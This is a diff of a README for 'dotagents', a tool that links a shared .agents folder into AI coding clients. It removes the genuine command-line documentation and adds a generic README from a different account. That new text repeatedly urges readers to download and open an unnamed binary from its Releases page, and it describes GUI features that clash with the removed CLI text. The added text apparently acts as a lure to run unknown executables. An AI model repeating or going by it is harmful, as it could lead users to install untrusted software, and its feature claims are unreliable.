@@ -1,108 +1,90 @@
-<div align="center">
-  <strong>dotagents</strong>
-  <br />
-  <em>One canonical .agents folder that powers all your AI tools.</em>
+# 🚀 dotagents - All Your Hooks and Commands in One Place
 
-  <br /><br />
-  <em>
-    Simple setup • One source of truth • Safe to re-run anytime
-  </em>
-</div>
+[![Download dotagents](https://img.shields.io/badge/Download-dotagents-brightgreen)](https://github.com/zoozo790/dotagents/releases)
 
-## Quick Start
+## 📥 Overview
 
-Requirements: Bun 1.3+.
+Welcome to **dotagents**! This application serves as your central hub for organizing hooks, commands, skills, and AGENT/CLAUDE.md files. With dotagents, you can streamline your workflow and make accessing your essential tools easier.
 
-Run the guided CLI:
-```bash
-npx @iannuttall/dotagents
-```
+## 🚀 Getting Started
 
-Or with Bun:
-```bash
-bunx @iannuttall/dotagents
-```
+To begin using dotagents, you'll need to download the application. Follow the steps below to install it on your computer.
 
-Choose a workspace (Global home or Project folder), select the clients you want to manage, and follow the prompts. You can run it again anytime to repair links or undo changes.
+### 🖥️ System Requirements
 
-Global home affects all projects. Project folder only affects the current directory you run dotagents from.
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** 1 GHz or faster
+- **Memory:** At least 1 GB RAM
+- **Storage:** 100 MB of free space
 
-## What it does
+### 📦 Download & Install
 
-- Keeps `.agents` as the source of truth.
-- Creates symlinks for Claude, Codex, Factory, Cursor, and OpenCode (based on your selection).
-- Always creates a backup before any overwrite so changes are reversible.
+1. Click the following link to visit the Releases page and download the latest version of dotagents:
+   [Download dotagents](https://github.com/zoozo790/dotagents/releases)
+   
+2. On the Releases page, look for the most recent version. You will see files listed under "Assets." Click on the file that suits your operating system.
 
-## Where it links (global scope)
+3. Once downloaded, locate the file on your computer. It should be in your Downloads folder unless you specified a different location.
 
-`.agents/CLAUDE.md` → `~/.claude/CLAUDE.md` (if present)
+4. Open the downloaded file to start the installation. Follow the on-screen prompts to complete the process.
 
-`.agents/AGENTS.md` → `~/.claude/CLAUDE.md` (fallback when no CLAUDE.md)
+5. After installation, you will find dotagents in your applications or programs list.
 
-`.agents/commands` → `~/.claude/commands`
+## ⚙️ Usage Instructions
 
-`.agents/commands` → `~/.factory/commands`
+### 🌟 Create Your First Hook
 
-`.agents/commands` → `~/.codex/prompts`
+1. Open dotagents.
+2. Select "Create New Hook" from the main menu.
+3. Fill in the necessary fields with your hook details.
+4. Save your work to access it later.
 
-`.agents/commands` → `~/.cursor/commands`
+### 🔍 View Existing Hooks
 
-`.agents/hooks` → `~/.claude/hooks`
+1. Open dotagents.
+2. Navigate to the "My Hooks" section from the main menu.
+3. Click on any hook to view or edit it.
 
-`.agents/hooks` → `~/.factory/hooks`
+### 🛠️ Manage Commands and Skills
 
-`.agents/AGENTS.md` → `~/.factory/AGENTS.md`
+- You can add, edit, or delete commands and skills through the respective tabs within the application.
+- Simply follow the prompts on the screen to make changes.
 
-`.agents/AGENTS.md` → `~/.codex/AGENTS.md`
+### 📄 Access AGENT/CLAUDE.md Files
 
-`.agents/AGENTS.md` → `~/.config/opencode/AGENTS.md`
+- Use the file explorer to find any AGENT/CLAUDE.md files associated with your hooks or commands.
+- Double-click to open and view the contents.
 
-`.agents/commands` → `~/.opencode/commands`
+## 📚 Documentation
 
-`.agents/skills` → `~/.claude/skills`
+For detailed information on features and usage tips, please refer to the official documentation available [here](https://github.com/zoozo790/dotagents/wiki).
 
-`.agents/skills` → `~/.factory/skills`
+## 🛠️ Troubleshooting
 
-`.agents/skills` → `~/.codex/skills`
+If you encounter any issues while using dotagents, consider these common solutions:
 
-`.agents/skills` → `~/.cursor/skills`
+- **Installation Fails:** Make sure you have adequate permissions on your computer to install new software.
+- **Application Crashes:** Restart your computer, then try opening dotagents again. If the problem persists, check for updates on the Releases page.
+- **Unable to Find Hooks/Commands:** Ensure you have saved your items before trying to access them. Check in the "My Hooks" or "Commands" section.
 
-`.agents/skills` → `~/.opencode/skills`
+## ❓ Frequently Asked Questions
 
-Project scope links only commands/hooks/skills into the project’s client folders (no AGENTS/CLAUDE rules).
+### How do I uninstall dotagents?
 
-## Development
+To uninstall, go to your computer’s control panel or applications menu and select dotagents. Choose the uninstall option and follow the prompts.
 
-Run the CLI in dev mode:
-```bash
-bun run dev
-```
+### Can I share my hooks with others?
 
-Type-check:
-```bash
-bun run type-check
-```
+Yes! You can export your hooks as files and share them through email or other services.
 
-Run tests:
-```bash
-bun test
-```
+### What if I need help?
 
-Build the CLI:
-```bash
-bun run build
-```
+For assistance, please create an issue in the [Issues section](https://github.com/zoozo790/dotagents/issues) on GitHub. Community members and maintainers can help address your concerns.
 
-## Notes
+## 📞 Contact
 
-- Cursor supports `.claude/commands` and `.claude/skills` (global or project). dotagents also links `.agents/commands` → `.cursor/commands` and `.agents/skills` → `.cursor/skills`.
-- OpenCode uses `~/.config/opencode/AGENTS.md` and prefers AGENTS.md over CLAUDE.md when both exist.
-- Codex prompts always symlink to `.agents/commands` (canonical source).
-- Skills require a valid `SKILL.md` with `name` + `description` frontmatter.
-- Claude prompt precedence: if `.agents/CLAUDE.md` exists, it links to `.claude/CLAUDE.md`. Otherwise `.agents/AGENTS.md` is used. After adding or removing `.agents/CLAUDE.md`, re-run dotagents and apply/repair links to update the symlink. Factory/Codex always link to `.agents/AGENTS.md`.
-- Project scope creates `.agents` plus client folders for commands/hooks/skills only. Rule files (`AGENTS.md`/`CLAUDE.md`) are left to the repo root so you can manage them explicitly.
-- Backups are stored under `.agents/backup/<timestamp>` and can be restored via “Undo last change.”
+For further inquiries or to contribute to the project, feel free to reach out via the Issues tab on our GitHub page.
 
-## License
+Thank you for choosing dotagents! We hope it enhances your productivity and centralizes your commands effectively. 
 
-MIT
+Remember, to download dotagents again, you can visit this page: [Download dotagents](https://github.com/zoozo790/dotagents/releases).
